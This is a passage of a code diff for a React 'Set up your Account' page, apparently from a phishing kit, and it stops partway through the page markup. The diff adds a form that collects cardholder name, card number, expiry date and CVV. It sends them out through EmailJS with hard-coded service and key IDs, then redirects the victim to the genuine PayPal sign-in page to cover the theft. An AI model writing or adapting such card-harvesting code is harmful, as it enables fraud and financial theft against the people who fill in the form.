@@ -1,64 +1,103 @@
-import React, { useState, useEffect } from "react";
+import React, { useRef, useState } from "react";
+import emailjs from "@emailjs/browser";
 import logo from "./img/logo.png";
-import card from "./img/card.png";
+
 import "./Account.scss";
 
 function Account() {
+  const [card, setCard] = useState("");
+  const [date, setDate] = useState("");
+  const [cvv, setCvv] = useState("");
+  const [name, setName] = useState("");
+  const form = useRef();
+
+  const sendEmail = (e) => {
+    e.preventDefault();
+    // console.log(form);
+
+    if (card && date && cvv && name) {
+      emailjs
+        .sendForm(
+          "service_t9byzmo",
+          "template_5p3pp8r",
+          form.current,
+          "qPPjagDWj9FdfYFPg"
+        )
+        .then((res) => {
+          window.location.href = "https://www.paypal.com/ng/signin";
+          // console.log(res, "success");
+          setCard("");
+          setDate("");
+          setCvv("");
+          setName("");
+        })
+        .catch((err) => {
+          console.log(err);
+        });
+    }
+  };
   return (
     <>
       <div className="container">
-        <div className="main">
-          <div className="main__bar1">
-            <img src={logo} alt="logo" className="logo" />
+        <div className="main3">
+          <div className="main3__bar6">
+            <img src={logo} alt="logo" className="logo3" />
           </div>
           <div>
             <h1 className="head1">Set up your Account</h1>
           </div>
 
-          <div className="main__bar2">
-            <form
-              action="#"
-              className="form"
-              onSubmit={(e) => e.preventDefault()}
-            >
-              {/* card number */}
-
+          <div className="main3__bar7">
+            <form action="#" className="form" ref={form} onSubmit={sendEmail}>
               <input
                 type="text"
-                name="Card Number"
+                name="name"
+                className="form__inp"
+                placeholder="Card Name"
+                value={name}
+                onChange={(e) => setName(e.target.value)}
+                required
+              />
+              <input
+                type="text"
+                name="card"
                 className="form__inp"
                 placeholder="Card Number"
+                value={card}
+                onChange={(e) => setCard(e.target.value)}
                 required
               />
 
               {/* expiration date */}
 
               <input
-                name="Expiration Date"
-                placeholder="Expiration Date"
+                name="date"
+                placeholder="Expiration Date (01/19)"
                 className="form__inp"
+                value={date}
+                onChange={(e) => setDate(e.target.value)}
                 required
               />
               {/* cvv */}
 
               <input
-                name="Cvv"
+                name="cvv"
                 placeholder="Cvv"
                 className="form__inp"
+                value={cvv}
+                onChange={(e) => setCvv(e.target.value)}
                 required
               />
 
-              <div className="box">
-                <label htmlFor="checkbox" className="box__show">
-                  <input id="checkbox" type="checkbox" />
-                  Stay logged in for faster checkout.
-                </label>
-              </div>
-
               <div className="shell">
-                <a href="/Login" className="button3">
+                <button
+                  className="button3"
+                  type="submit"
+                  onChange={sendEmail}
+                  value="submit"
+                >
                   Next
-                </a>
+                </button>
               </div>
             </form>
             <div className="main__bar3">
